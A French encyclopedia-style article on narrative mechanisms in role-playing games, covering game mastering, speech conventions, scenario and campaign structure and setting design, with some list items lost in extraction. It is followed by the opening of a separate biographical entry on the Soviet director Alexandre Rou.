Dans certains jeux post-2000, les trois niveaux sont mis en œuvre pendant la partie ; dans le cas d'un jeu de rôle « classique » — avec un meneur de jeu et un scénario préparé à l'avance —, les deux premiers niveaux font partie de la préparation par le meneur de jeu, seul le troisième niveau concerne la partie de jeu proprement dite.
Nous présentons d'abord la phase qui concerne tous les joueurs de tous les jeux, donc les phases sont présentées à rebours.
Notons que cet article ne traite pas du « narrativisme » en tant que manière de jouer, mais de la narration quel que soit le style de jeu, y compris « ludiste » ou « simulationniste ».
Mécanismes élémentaires.
Dans le jeu de rôle, la narration est issue de l'imagination des créateurs du jeu et des joueurs. Ces éléments issus de l'imaginaire sont mis en commun, partagés :
La naissance de l'histoire est soumise à des contraintes :
La finalité d'une partie de jeu de rôle étant la création d'une histoire, on peut dire que tout ce qui intervient dans la partie — dont les ouvrages de jeu (règles, description de l'univers, scénario), les accessoires (feuilles de personnage, dés, figurines, aides de jeu…), les interventions des joueurs — font partie des mécanismes narratifs ; on retrouve là le principe de Baker-Care « tout est système ». Toutefois, si la "finalité" (ce que l'on obtient à la fin) est une histoire, ce n'est ne revanche pas nécessairement l"objectif" de tous les joueurs : certains veulent relever des défis, d'autres veulent s'immerger dans le monde fictionnel et éprouver des émotions… Tous les éléments n'interviennent donc pas au même degré.
Édiction de l'histoire.
Quel que soit le jeu — de rôle ou narratif — la finalité de la partie est la formulation orale d'une histoire, à plusieurs conteurs. Cette phase est proche du théâtre d'improvisation, puisqu'elle met en œuvre des capacités d'interprétation et d'improvisation avec des contraintes — thème donné, mécanismes de simulation.
Dans sa définition la plus large, on peut dire que
Une responsabilité partagée entre les joueurs.
Dans les jeux considérés, l'histoire s'écrit à plusieurs voix, chacun est donc responsable de la « bonne construction » du récit. Un élément important est de limiter la suspension consentie de l'incrédulité : si les participants acceptent des situations inhabituelles et des événements impossibles, en particulier dans les genres fantastiques et de science-fiction, il faut néanmoins une cohérence interne à l'univers fictif, et que les personnages, joueurs comme non-joueurs, aient un comportement plausible.
Interprétation des personnages-joueurs.
Pour les joueurs de personnage, c'est-à-dire les joueurs de jeu de rôle autres que le meneur de jeu, on trouve souvent des conseils dans les revues spécialisées, notamment :
Les règles de création du personnage peuvent aider à lui donner de la profondeur, comme, le mécanisme d'avantage/défaut. Dans "Tenga", le joueur doit choisir
Le jeu "Wuxia" propose, pour définir le concept du personnage, de répondre aux questions suivantes :
Les systèmes de classe de personnage ou d'archétype peuvent fournir des éléments de motivation et de caractère stéréotypés pour les personnages.
Maîtrise de la partie.
Les conseils donnés au meneur de jeu sont en général :
Notons que l'entorse aux règles de simulation de la part du meneur de jeu n'est en général pas considérée comme de la triche tant qu'elle sert à la progression de l'histoire et qu'elle n'introduit pas de favoritisme envers un joueur, et n'est pas un prétexte pour nuire aux personnages-joueurs. Gary Gygax déclarait d'ailleurs
De fait, dans certains cas, les règles de simulation vont à l'encontre de la construction de l'histoire, comme quand par exemple un personnage meurt « bêtement » ou passe à côté d'un indice capital à cause d'un mauvais jet de dé, ou bien lorsque les personnages tournent en rond sans trouver la solution à une énigme ; le meneur de jeu donne alors un « coup de pouce » en faisant une entorse aux règles de simulation, ce qui a fait dire à certains que le système n'a pas d'importance, "system doesn't matter"
Dans les jeux de rôle classiques, c'est le meneur de jeu qui a la plus grande responsabilité : c'est lui qui propose les situations, c'est lui qui énonce les descriptions de l'environnement et des figurants, c'est lui qui arbitre, départage, et donc décide en grande partie de la progression de l'histoire. Pour autant, les joueurs de personnages maintiennent l'ambiance et sont en général les moteurs de l'action. Les règles insistent souvent sur le fait que c'est un jeu de collaboration, de coopération ; il n'y a pas de vainqueur ni de perdant, ni du côté du meneur de jeu, ni du côté des joueurs de personnages.
Les jeux narratifs, quant à eux, attribuent en général une responsabilité à chaque joueur de manière explicite. Ils cherchent en général à diminuer l'asymétrie joueur de personnage/meneur de jeu, par exemple en imposant des actions au meneur, en permettant à un joueur d'imposer un élément d'histoire — donc d'influer autrement que par l'action de son personnage — ou bien en instaurant une rotation du rôle de meneur de jeu, voire en supprimant le meneur de jeu. En effet, si chaque joueur apporte un élément d'histoire, ou bien si ces éléments proviennent du matériel — comme un tirage de cartes — alors aucun joueur n'a de rôle central.
On peut par exemple citer le cas du jeu "Apocalypse World", dans lequel les joueurs ont huit actions narratives possibles — agir face au danger, agresser quelqu'un, prendre par la force, séduire ou manipuler, faire le point, cerner quelqu'un, ouvrir son cerveau, aider ou interférer — et le « maître de cérémonie » (le pseudo-meneur de jeu) en a quinze — décrire les échecs des personnages (blessures, perte de matériel), annoncer un problème à venir, préparer une opportunité aux personnages, …
Contrairement aux jeux de rôle, les jeux narratifs peuvent introduire une compétition entre les joueurs, avec une notion de gagnant et de perdant.
Des conventions d'intervention.
Les conventions d'intervention régulent le partage de la parole ; elles définissent donc qui édicte l'histoire et à quel moment. On parle aussi de responsabilité narrative, d'autorité (le fait d'être auteur, mais aussi le fait d'être influent et responsable) ou de crédibilité (avoir du crédit).
En jeu de rôle, la manière dont interviennent les joueurs est en général régie par des conventions implicites. Par exemple, si un personnage est absent d'une scène, alors le joueur s'abstient de parler — certains meneurs demandent d'ailleurs à ces joueurs de se mettre à part pour ne pas suivre cette partie de l'histoire. Ou encore, si un joueur dispose d'une information que son personnage ne peut pas connaître, il doit faire comme s'il l'ignorait. Et de manière générale, dans un jeu de rôle « classique », un joueur de personnage n'expose que ce que dit ou fait son personnage, pas ce que font les personnages des autres joueurs, ni ce qui se passe alentour, qui est du ressort du meneur de jeu.
Là encore, les jeux narratifs tendent à proposer d'autres conventions, chaque joueur étant vu plus comme un coauteur que comme un participant cadré.
Par ailleurs, lorsqu'un joueur énonce une action, il est important de savoir çà quelle étape de l'action il se réfère : intention, début de la mise en œuvre "()", fin de l'action "()", effet de l'action ; on parle parfois d'IIEE "()" ou de IIEC ou IICE (C pour ""). Par exemple, lorsqu'il dit qu'il , cela signifie-t-il que :
Un autre paramètre important des conventions d'intervention concerne la mécanique de résolution : lorsque le hasard est en jeu "()", y a-t-il des « choses à ajouter » après le jet de dé ou équivalent (tirage de carte, de jetons…) ? Dans les premiers jeux, on considérait en général que le joueur annonçait ce qu'il faisait (intention), et que le jet de dés indiquait la conséquence, le joueur n'ayant plus rien à préciser après le jet ; cette situation est dite « hasard à la fin », ou ', FatE. Mais on peut également considérer que le joueur énonce une intention générale d'action, et qu'une fois le jet de dé effectué, il précise la manière dont il a effectué l'action, et pourquoi elle a échoué ; on parle de « hasard au milieu », ', FitM. Cette dernière option peut être exploitée explicitement par les règles de résolution, en permettant au joueur de décider de certaines choses après le jet de dés, par exemple dépenser des « points de destin » pour infléchir le résultat ; on parle alors de « hasard au milieu avec les dents » "".
Différences entre un texte narratif et une partie de jeu de rôle.
Même si une partie de jeu de rôle, ou de jeu narratif, consiste à créer une histoire, il existe des différences notables par rapport aux textes narratifs (romans, nouvelles). La première est le recours aux clichés : les clichés et poncifs sont souvent mal perçus dans les textes narratifs (ou d'ailleurs les films), et l'on dira volontiers que « le scénario est téléphoné », « la ficelle est un peu grosse ». Étrangement, les joueurs sont plus tolérants à ces procédés, peut-être parce qu'ils participent dynamiquement à l'élaboration de l'histoire. Selon Isabelle Périer, le recours aux poncifs a aussi une raison d'être « économique » (dans le sens économiser les moyens, avoir une rentabilité par rapport au temps investi) : alors qu'un univers fictionnel va donner lieu à quelques œuvres filmées qui sortiront au rythme de un tous les deux ans au mieux, il va donner lieu à plusieurs dizaines de scénarios, au rythme de plusieurs scénarios par an, le meneur de jeu doit donc produire bien plus qu'un scénariste de cinéma. Par ailleurs, la stéréotypie représenterait une stabilité face à la complexité du monde réel. C'est ainsi que l'on trouve souvent des personnages stéréotypés (voir la notion de classe de personnage dans les premiers jeux de rôle, et d'archétype dans des jeux plus récent), des aventures type (sauver la princesse, sauver le monde).
La deuxième différence concerne les détails sur la vie de tous les jours.
En fait, nous touchons là une des différences fondamentales entre un texte narratif et un jeu de rôle. Dans le premier, l'auteur sélectionne et impose à son lecteur les informations qui sont utiles au déroulement de récit : si l'on voit souvent Sherlock Holmes lire le "Daily Telegraph", on ne l'entend jamais dire combien lui coûtait son achat, tout simplement parce que ça n'est d'aucun intérêt dans l'intrigue. Dans un jeu de rôle par contre, les joueurs interagissant, ils peuvent très naturellement s'inquiéter d'un détail aussi banal, tout simplement parce qu'en tant que joueurs, dans la vie de tous les jours, le prix d'un journal n'est pas anodin.
On peut faire un parallèle avec ce qu'Umberto Eco appelle les "« promenades inférentielles »" : il s'agit, pour le lecteur, de s'échapper hors du texte pour y revenir "« riche d'un butin intertextuel »" ("Lector in fabula", 1985).
Un univers imaginaire commun.
Même si les joueurs peuvent utiliser des supports visuels, audio ou matériels — illustrations (dessins, photographies), musique, figurines, voire déguisement et maquillage (pour des pratiques de type grandeur nature) … —, chaque participant (meneur de jeu, joueur de personnage) ou spectateur imagine la scène pour lui-même. Pour des raisons de cohérence narrative (les joueurs prennent des décisions/les personnages agissent selon la logique interne du monde, voir "Interprétation du rôle"), les joueurs doivent avoir des références communes. Si l'apparence de tel personnage ou objet peut varier dans l'imaginaire de chaque joueur, ils doivent en revanche s'accorder sur les capacités générales de telle créature (p. ex. les elfes voient dans le noir) ou de tel objet (p. ex. un M16 a une portée de plusieurs centaines de mètres et peut difficilement se cacher dans des vêtements).
Le groupe doit prendre ceci en compte lorsqu'il choisit le jeu auquel il va jouer — on parle ici du jeu en tant que produit, ouvrage —, c'est-à-dire lorsqu'il choisit l'univers et les règles du jeu qui l'accompagnent. Une partie dans un univers original et exotique pourra créer des situations intéressantes ; mais un nouveau joueur arrivant dans un groupe familier de cet univers pourra se sentir perdu voire exclus. De même, jouer dans un univers de licence — tiré de romans, films, jeux vidéo comme "Le Seigneur des anneaux", "Star Wars", "Le Trône de fer", "World of Warcraft" — peut nécessiter de connaître les œuvres en question ; cela peut notamment poser problème lorsque certains joueurs n'ont pas accès à ces œuvres, par exemple souffrent d'un handicap visuel. Jouer dans un univers « inconnu » n'est pas en soi un problème à condition que le meneur de jeu en soit conscient et que les joueurs soient au « même niveau de découverte » du monde, ou bien que la différence de connaissance du monde soit volontairement un mécanisme moteur du jeu ; on peut par exemple imaginer une unité militaire en opération extérieure (type occupation romaine, guerre coloniale, guerre du Vietnam) comprenant des vétérans et des jeunes recrues.
À l'inverse, jouer dans un univers trop familier peut poser d'autres problèmes. Les joueurs risquent de ne pas mettre assez de distance par rapport à la fiction. Il est plus difficile de suspendre son incrédulité ; typiquement, si l'action se déroule dans un lieu que connaît un des joueurs, celui-ci peut se dire, et dire aux autres, « mais non, ce n'est pas ainsi ». Le problème peut aussi se poser lorsque la narration aborde un thème dont un joueur est spécialiste : un point technique, historique, … Enfin, à une période où le jeu de rôle était soupçonné en France de favoriser des comportements criminels ou suicidaires (fin des années 1980 et surtout dans les années 1990, voir l'article "Critiques du jeu de rôle"), il est apparu important de limiter l'identification entre le joueur et le personnage, que le joueur ait une distance par rapport au personnage. C'est ainsi, par exemple, que la première version du jeu "Trauma", jeu de rôle contemporain « réaliste » (non fantastique), proposait initialement (en 1986) au joueur de jouer son propre rôle, et que cette possibilité a disparu dans l'édition de 1988 (ça et le fait qu'un personnage « commun » a peu de chances de survie dans une aventure héroïque, hors du commun).
Cette notion d'univers imaginaire commun peut sans doute expliquer le succès d'univers stéréotypés (médiéval-fantastique « standard ») ou proches du réel (jeux de rôle historiques, uchroniques, contemporains ou dans un futur proche), ou de licences très connues. Cette intertextualité (éléments empruntés à d'autres textes) puisant en général dans la « culture geek » permet d'intégrer facilement de nouveaux joueurs dans un groupe, économise des descriptions au meneur de jeu, …
L'univers imaginaire commun est une des composantes de « l'espace imaginaire commun » tel que défini par Joseph Young, et qui désigne ce qui est commun dans la manière dont chacun des joueurs imagine l'histoire.
Conception des scènes.
Nous distinguons ici la conception — définir le concept, l'idée de base de la scène — de la création — édiction effective, « mise en mots » de la scène, « concrétisation » de l'idée de base, qui est décrite dans la section précédente.
La conception des scènes est radicalement différente dans les jeux narratifs et dans les jeux de rôle. En effet, l'essence des jeux narratifs est de créer des scènes ; cette conception se fait donc au fil du jeu, par tous les joueurs — à tour de rôle ou bien ensemble. Dans les jeux de rôle, le but est de faire évoluer la scène à partir d'une situation initiale, le concept est donc en général établi avant le début de la partie ; « en général », car le meneur de jeu peut avoir à improviser une scène et donc à la concevoir à la volée.
Nous nous centrons ici sur la conception dans le cadre des jeux de rôle : comme c'est l'essence dans les jeux narratifs, cela relève de l'article dédié.
Comme énoncé précédemment, un joueur de personnage est là pour participer, donc son personnage doit avoir l'occasion de faire quelque chose, et si possible de faire progresser l'action de manière notable, de « briller » : résoudre une énigme, combattre un adversaire, gérer une rencontre en finesse, … En jeu de rôle, une des responsabilités du créateur de scénario est de proposer des situations qui permettent ceci.
Si le scénario est écrit par le meneur de jeu, celui-ci doit concevoir des défis à la mesure des personnages : ni trop difficiles, ce qui conduirait à un échec qui serait perçu par les autres joueurs comme injuste, ni trop faciles, car « à vaincre sans péril, on triomphe sans gloire. » Si le meneur de jeu se contente de reprendre un scénario préexistant, il peut avoir un travail d'adaptation à faire. L'éditeur d'un scénario prêt-à-jouer, quant à lui, devrait mentionner le type d'interactions majoritaire, et une évaluation du niveau de difficulté. En général, la difficulté est donnée par :
Certains scénarios indiquent d'ajuster le nombre de combattants au nombre de personnages-joueurs. Certains jeux proposent un système d'évaluation de la difficulté. Par exemple, dans la version 3 de "Donjons et Dragons", chaque rencontre ou piège est assorti d'un facteur de puissance (FP) permettant d'ajuster le rapport de force. D'autres jeux, comme "Fantasy Craft", prévoient de « niveler » les rencontres, c'est-à-dire d'adapter la puissance des opposants au niveau du groupe : au lieu de fixer une valeur aux caractéristiques des opposants, le meneur de jeu fixe une « classe de puissance », la valeur de la caractéristique est fonction de cette classe et du niveau du groupe (elle est lue sur une table à double entrée).
Toutefois, si les joueurs ne rencontrent que des situations à la portée de leurs personnages, il peut s'ensuivre un émoussement de l'excitation. Certains scénarios proposent donc des situations « trop » difficiles, le but n'étant alors pas de « vaincre » mais plutôt d'esquiver ou de survivre. La prise de conscience du danger se fait souvent par une confrontation indirecte : les personnages sont témoins d'un événement donnant la dimension du danger, une des ficelles consistant à faire mourir un personnage non-joueur — procédé surnommé « syndrome de "Star Trek" » (notamment par le journal "Casus Belli"), et parfois "red shirt" (« chemise rouge », en référence aux uniformes des personnages de "Star Trek").
Cela met en évidence deux manières de jouer, deux « contrat sociaux » : dans le premier cas, le meneur de jeu propose des épreuves à la mesure des personnages et le jeu est centré sur la manière dont les personnages vont réussir à atteindre leur but. Dans le second cas, on a un monde « indépendant » des personnages, c'est aux joueurs d'estimer si une tâche est à la hauteur de leurs personnages ou s'ils doivent la fuir ou l'éviter et le jeu est plus centré sur la tournure que prend l'histoire.
Conception de la trame.
La structure des scénarios.
Dans un jeu de rôle, une part importante de l'histoire réside souvent dans le scénario. Il existe des exceptions, comme des scénarios qui se contentent de décrire des lieux, des personnages et des situations sollicitant les personnages-joueurs, et laissent la part belle à l'improvisation ou au travail de préparation du meneur de jeu ; on parle parfois de « bac à sable ». C'est le cas par exemple de "La Cité des treize plaisirs" pour "Rêve de Dragon".
On distingue souvent deux types de scénarios : les scénarios linéaires et les scénarios ouverts. Un scénario linéaire est un scénario dans lequel les situations s'enchaînent dans un ordre déterminé sans que les joueurs puissent changer cet ordre ; dans la typologie proposée par Joseph Young dans "Le Truc impossible avant le petit-déj’", c'est un jeu de type « illusionisme » ou « participationnisme ». Un scénario ouvert est au contraire un scénario dans lequel c'est l'action des personnages-joueurs qui détermine la scène suivante. Si l'on considère le plaisir du jeu :
La plupart des scénarios sont entre les deux situations. Par exemple, dans le cas d'une enquête, les personnages doivent rassembler un certain nombre d'éléments pour pouvoir progresser, ce qui est en soi linéaire ; mais l'ordre et la manière d'obtenir ces éléments peut être au contraire ouvert, et l'on peut avoir plusieurs manières de suivre une piste. Par ailleurs, on peut avoir des passages linéaires au sein d'un scénario plutôt ouvert.
Les auteurs de jeux de rôle ou d'articles font parfois références à des « classiques » de narratologie, comme la "Poétique" d'Aristote, le schéma actantiel de A. J. Greimas, l"Introduction à la littérature fantastique" de Tzvetan Todorov, le Voyage du héros de Joseph Campbell ou les temps forts "(story beats)" de , pour aider à l'écriture de scénarios ou d'une campagne. D'autres auteurs proposent d'utiliser une structure d'arc narratif, c'est-à-dire d'avoir plusieurs histoires se chevauchant dans une campagne. Cela a notamment donné la méthode dite « 5 × 5 », qui consiste à prévoir cinq arcs narratif découpés chacun en cinq parties, avec la possibilité de changer d'arc entre chaque partie ; chaque arc narratif est linéaire, mais leur combinaison permet de rompre cette linéarité. Il existe encore des scénarios avec une structure inhabituelle, par exemple à rebours. Mais de manière générale, on a :
Une partie de jeu de rôle d'environ comporte en général trois à cinq scènes, ouverture et dénouement compris ; chaque scène comporte une ou plusieurs « rencontres » — rencontre avec un pro- ou antagoniste (opposant, informateur, employeur, …), énigme, négociation, investigation, et de manière générale tout événement ayant une intensité dramatique (ayant un enjeu, créant une attente, modifiant le cours de l'histoire).
Typiquement, un scénario peut donc être représenté par trois documents :
Les schémas actanciel et dramatique peuvent être présentées sous forme de tableau synoptique ou bien de schéma conceptuel.
À ceci s'ajoute (voir plus loin "Création de l'environnement")
Scénario type.
Il existe un certain nombre de scénarios types :
Certains jeux sont explicitement orientés vers un scénario type, comme l'exploration de donjon dans "Donjons et Dragons" — et, poussé à l'extrême, le porte-monstre-trésor — ou les enquêtes dans "L'Appel de Cthulhu". Cela ne signifie pas que les parties soient cantonnés à un scénario type, mais que les mécanismes de simulation du jeu facilitent ce type de scénario. Le scénario type fournit un guide de conception de l'aventure, et le développement de l'histoire est facilement identifiable par tous les joueurs, ce qui facilite la coopération narrative ; d'un autre côté, la répétition peut lasser. On peut très bien avoir un faux scénario type : l'histoire commence selon les standards d'un scénario type mais dévie ensuite, selon le principe de la fausse piste.
Pour faciliter l'identification de produits tout faits, certains éditeurs font figurer le type d'aventure. C'est le cas par exemple de Paizo Publishing qui a découpé sa gamme de modules indépendants en huit séries dont six désignent le type d'aventure : D (donjons), S (sauvage, ou W "wilderness"), U (urbain), J ("journey", voyage), T ("treasure chest wilderness adventure", chasse au trésor) et E (événements).
Le type d'aventure doit convenir au groupe. Dans l'idéal, le choix se fait en concertation avec tous les joueurs, même si, dans le cas d'une campagne, une rupture de la monotonie peut être appréciée. Selon les auteurs de "Savage Worlds", on peut distinguer trois types de campagnes : combat, exploration et interprétation "(roleplay)", auxquelles on peut ajouter une dose plus ou moins importante d'horreur. Les auteurs de "Fantasy Craft" classent les styles de jeu selon trois axes :
ils utilisent également les trois axes suivants :
Les moteurs de l'histoire.
Le premier point du scénario est l'accroche, c'est-à-dire comment impliquer les personnages-joueurs, et donc les joueurs. Selon les auteurs de "Fantasy Craft", les motivations typiques des personnages-joueurs sont : « la curiosité, un problème moral ou éthique, l'avarice, la luxure, la peur, la colère, le remords, le ressentiment, la loyauté, un besoin d'excitation ou de découverte, un brûlant désir de vengeance, une lutte désespérée pour la survie, le simple désir de vaincre ou tout autre chose qui attisera les passions […]. La plupart des joueurs peuvent être appâtés avec la simple promesse de… plus. » On retrouve souvent les éléments suivants :
De manière synthétique, on peut distinguer des implications de type « mission », « historique » (passé des personnages), « bâton/carotte » ou « mort ou vif », avec la possibilité d'associer deux implications. Le passé des personnages peut être constitué des aventures qu'ont déjà vécu les personnages, le meneur de jeu s'appuyant sur les parties précédentes pour impliquer les personnages-joueurs ; il peut aussi s'agir d'éléments déterminés lors de la création "()".
Ces accroches donnent en général le type de scénario, mais il peut s'agir d'un leurre, d'un prétexte, d'un MacGuffin. Certaines accroches sont des accroches type d'un jeu donné ; c'est le cas en particulier des jeux à mission, des jeux où les personnages font partie d'une organisation, par exemple :
Cette notion d'accroche inclut, au moins partiellement, les raisons qui poussent les personnages joueurs à former un groupe. Les meneurs de jeu débutants ou en manque d'imagination éludent souvent cette question, ce qui est caricaturé au début du "" :
Un des poncifs des jeux de rôle médiévaux-fantastiques est la taverne : les personnages ont rendez-vous avec un potentiel employeur à la taverne, ou bien sont en train de se détendre à la taverne et sont contactés, ou encore se retrouvent mêlés malgré eux à une intrigue. Les poncifs de début d'aventure répondent là encore à un impératif « économique », le meneur de jeu n'ayant que quelques jours ou semaines pour concevoir un scénario devant impliquer plusieurs personnages.
Certains jeux au contraire mettent la création du groupe au cœur de la trame scénaristique. Par exemple, dans "Ars Magica", les personnages joueurs forment une alliance ; dans "Hurlements", les personnages font partie d'une caravane ou constituent une équipe de journalistes dans Channel Fear. Dans "Tenga", la création du groupe est un des points essentiels du début d'une campagne, ce point occupe un chapitre entier du livre des règles ; un groupe est défini par
Dans le jeu "Apocalypse World" et les jeux dérivés "()", a codifié le « savoir-faire » en termes de « motorisation » de scénarios et a créé la notion de « front ». Un front est une faction poursuivant un but, avec :
Un scénario comporte typiquement un à trois fronts. La notion de front recouvre celle de schéma dramatique exposée ci-dessus.
Dans le jeu "Fiasco", a codifié l'utilisation de liens entre les personnages comme moteur principal de la narration. Chaque personnage est lié à deux autres personnages — incarnés par les joueurs situés à sa gauche et à sa droite — par une relation, qui peut être un lien familial, une relation amoureuse, une relation professionnelle, un objet (bien convoité, arme…) ou un lieu. Ces relations sont l'objet des différentes scènes d'une partie.
Lier les différentes parties.
Lorsqu'un même groupe de joueurs joue régulièrement, il devient intéressant de lier les parties entre elles. C'est la notion de « campagne », du terme anglais "campaign", la campagne militaire (le jeu de rôle étant issu du jeu de guerre). Vivien Féasson fait un parallèle entre le jeu de rôle et les séries télévisées, un scénario (une partie) étant un épisode et une campagne étant une saison :
Dans une première approche, une compagne consiste en une unité narrative :
Une campagne peut désigner des situations aussi diverses qu'un cadre de jeu (un univers « bac à sable » dans lequel évoluent les personnages) ou un grand scénario s'étendant sur plusieurs séances de jeu (en général au minimum 3 à 5).
C'est notamment là qu'intervient la notion d'arc narratif et la méthode du « 5 × 5 » évoqués plus hauts, et qui permettent de mitiger la notion de linéarité.
Création de l'environnement.
Historiquement, c'est quasiment la seule partie qui était détaillée par les ouvrages : lieux, personnages non-joueurs, objets, …
L'environnement doit idéalement répondre à trois exigences :
Si un créateur de scénario crée, mettons, une habitation, c'est que celle-ci doit jouer un rôle dans l'histoire (composante N), par exemple : les joueurs doivent la fouiller pour trouver un indice qui fera avancer leur enquête. En outre, afin que les joueurs soient intéressés par cette exploration, elle doit receler des défis pour les joueurs (composante L) et donc leurs personnages ; cela peut être un intérêt inhérent au lieu — déjouer un système de détection, un piège, maîtriser un animal de garde, ouvrir un coffre-fort, trouver l'indice — ou bien externe : temps limité avant l'arrivée du propriétaire, ne pas éveiller les soupçons des voisins, …
Par ailleurs, la maison doit répondre à son usage normal dans l'univers (composante S) : on doit pouvoir y vivre, elle doit donc être fonctionnelle. S'il s'agit de la demeure d'un paranoïaque, on peut concevoir qu'il ait piégé certaines pièces, mais il a prévu un moyen de désamorcer ses propres pièges. Si le propriétaire a de la famille, des serviteurs, il ne peut pas piéger les endroits où ils vivent, travaillent et passent. Ceci se retrouve dans toute notion de « place forte » (château fort, banque, prison, caserne, commissariat…) : le lieu doit obéir aux règles de la poliorcétique (pouvoir soutenir un siège), mais les nécessités de vie et de fonctionnement, ainsi que les négligences du quotidien, introduisent des faiblesses, ne serait-ce que la nécessité d'avoir une porte…
Notons que la cohérence interne à l'univers de jeu (S) — qui, rappelons-le, permet de limiter la suspension consentie de l'incrédulité — était souvent une préoccupation secondaire pour de nombreux auteurs jusque dans les années 1990. C'est ainsi que fleurissaient des donjons remplis d'occupants sans possibilité de se nourrir ou même de respirer (des dizaines de kilomètres de couloirs et cavernes situés plusieurs centaines de mètres sous terre), sans parler de besoins plus triviaux, voire d'occupants sans but, les fameux « monstres errants » rencontrés au hasard, les scénarios fournissant des « tables de rencontres aléatoires ». Par ailleurs, la composante narrative (N) était souvent réduite à sa portion congrue ; elle se limitait en général à l'accroche du scénario. Seul importait alors l'intérêt ludique (L), c'est-à-dire le défis que cela représente pour les joueurs (énigmes, stratégie), portant en cela l'héritage du jeu de guerre (les premiers jeux de rôle étaient des dérivés des "wargames"). Par exemple, dans le scénario "The Place of Magic" pour "Palladium FRPG" (1984 pour sa première édition), le premier niveau du complexe souterrain est peuplé d'humains frappés par une malédiction, qui survivent là sans aucun moyen de subsistance ; ou alors le scénario "Le Puits (The Wishing Well)" pour les "Défis fantastiques : le jeu de rôle", où les héros explorent des galeries qui se trouvent au fond d'un puits à sec depuis peu — donc qui étaient encore récemment immergées — et dans lesquels on trouve une gargote… Dans un domaine connexe, le livre-jeu "Les Portes de l'Au-delà" (1984) illustre bien ce phénomène, avec un enchaînement de pièces sans lien les unes avec les autres et la présence de montres errants.
La création de l'environnement a donc idéalement trois dimensions :
Dans le scénario "Mourir dignement", Jérôme Larré ne dresse pas le plan d'un château, mais décrit 
Par exemple, la scène « seuil » ne peut être jouée qu'une seule fois et peut donc correspondre à une entrée par la grande porte (en trompant les gardes), au mur d'enceinte (en l'escaladant), aux canalisations (en nageant), aux geôles (en connaissant le milieu criminel), aux toits (en faisant preuve de discrétion)… Cette scène débouche sur un « lieu de vie », une « réserve », un « passage dégagé » et un « passage risqué ». Le scénario fournit donc une description technique (sans plan) et une description dramatique des lieux, mais la saveur et l'apparence exactes sont laissés aux soins du meneur de jeu. Il y a au total neuf scènes différentes que le meneur de jeu peut enchaîner comme bon lui semble (en respectant les transitions possibles entre scènes), à la volée (en improvisant en cours de jeu). 
Pour un certain nombre d'auteurs, la variété des rencontres réside plus dans la variété des saveurs et du contexte dramatique, que de la variation des caractéristiques techniques. Par exemple, la tendance était initialement de proposer une pléthore d'armes ayant chacune ses propres valeurs chiffrées, voir par exemple le tableau des armes des "Règles avancées de Donjons &amp; Dragons" ou bien les multiples tableaux de "Rolemaster" ; à l'inverse, de nombreux jeux récents, comme "Usagi Yojimbo éd.", assimilent des armes dans des grandes catégories, par exemple, les armes tranchantes sont toutes identiques d'un point de vue technique, et ont simplement une apparence différente. Dans le même ordre d'idées, le jeu de rôle "SimulacreS" propose uniquement trois types de personnages non-joueurs secondaires : les faibles, les moyens et les forts, à la charge du meneur de jeu de les « habiller » de signes distinctifs. C'est d'ailleurs la démarche que suivent un certain nombre de jeux de rôle génériques : certains éléments sont techniquement identiques d'un univers à l'autre, seule change la description.
La gamme "Palladium FRPG" fournit deux exemples opposés totalement pour la description des royaumes :
"L'Encyclopédie du monde" de "Loup Solitaire" ou "La Mer Intérieure" de "Pathfinder" allient les deux, puisqu'ils fournissent des cartes des différentes régions, et pour chaque royaume, à la fois des caractéristiques chiffrées (comme la population) mais aussi un court historique, les relations avec les autres royaumes ainsi que les événements en préparation (et donc des amorces de scénarios).
Générateurs aléatoires.
Un certain nombre d'ouvrages proposent des tables permettant de « choisir » par un jet de dé tel ou tel élément de l'histoire. Dans le cas des jeux de rôle, il ne s'agit en général pas d'une obligation, mais plutôt d'une aide : ainsi, le meneur de jeu n'a pas à s'occuper de tous les détails durant la phase de préparation, certains peuvent être déterminés « à la volée ».
Dans sa première édition, le "Guide du maître" des "Règles avancées de Donjons et Dragons" proposait un générateur aléatoire de donjons : des tirages de dés indique la forme des pièces, ce qui s'y trouve, puis pour chaque issue, le type de couloir. Une méthode un peu différente est proposée dans les "Défis fantastiques" : le meneur de jeu jette des dés à six faces ; leur emplacement indique l'emplacement de la pièce sur le plan, et le chiffre (divisé par deux) indique le nombre d'issues.
On trouve également des tables de butin, qui permettent de déterminer les objets en possession d'une créature tuée ou capturée.
Outre les éléments d'environnement, il existe aussi des tables d'accroche de scénario. L'éditeur Les XII Singes a également publié "Imagia", un jeu de cartes donnant des éléments narratifs à introduire dans les parties (soit dans le cadre de la préparation, soit en cours de partie). Certaines tables utilisent les Rory's Story Cubes ou bien des logiciels.
La génération aléatoire est un des mécanismes des jeux narratifs. En effet, puisque l'intérêt est la manière dont on construit et raconte l'histoire, l'introduction d'éléments aléatoires est une contrainte qui oblige les joueurs à faire preuve d'inventivité pour assurer une cohérence. C'est également un des mécanismes utilisé dans le "old-school renaissance".
Création collaborative.
Un certain nombre de jeux proposent de créer le cadre de l'aventure de manière coopérative : les joueurs définissent l'objectif de la partie, la topologie des lieux, les obstacles qu'ils rencontrent… Les jeux s'attachent toutefois à respecter le principe selon lequel un joueur qui définit une opposition n'est pas celui qui est chargé de la résoudre. Cette démarche est une forme de partage narratif.
Par exemple, dans "Wilderness of Mirrors" (John Wick, 2011), les joueurs font partie d'un service secret. La séquence de création du cadre correspond à la réunion de préparation de la mission "()". La partie est ensuite menée de manière classique, avec un meneur de jeu chargé de mettre en scène les éléments définis, en ajoutant éventuellement ses propres éléments.
Le jeu d'horreur "Sombre" (Johan Scipion, 2011) propose un mode de jeu sans préparation de scénario appelé "Quickshot", la création du cadre se faisant par un brainstorming. Selon l'auteur, comme les joueurs participent eux-mêmes à la création du cadre, tous les éléments définis en commun sont déjà assimilés dans la fiction par les joueurs, ce qui permet de gagner du temps durant la partie et favorise l'immersion.

</doc>
<doc id="7276888" url="https://fr.wikipedia.org/wiki?curid=7276888" title="Alexandre Rou">
Alexandre Rou

Alexandre Arturovitch Rou (en , translittération ISO 9 Aleksandr Arturovič Rou, transcription traditionnelle : Aleksandr Artourovitch Roou, parfois translittéré en Aleksandr Rou, Roou, Row ou Rowe), né le à Moscou dans l'Empire russe et mort le à Moscou en URSS, est un cinéaste soviétique, principalement réalisateur et scénariste.
Il a réalisé de nombreux films, dont beaucoup d'adaptations de contes et légendes russes destinés à un jeune public.
Biographie.
Alexandre Arturovitch Rou naît le à Moscou, dans l’Empire russe, d’un père irlandais et d'une mère grecque.
En 1930, il travaille au studio Mezhrabpom-Film comme assistant à la réalisation, puis comme coréalisateur avec Yakov Protazanov pour les films "Marionnettes" en 1934 puis "Sans dot" en 1937.
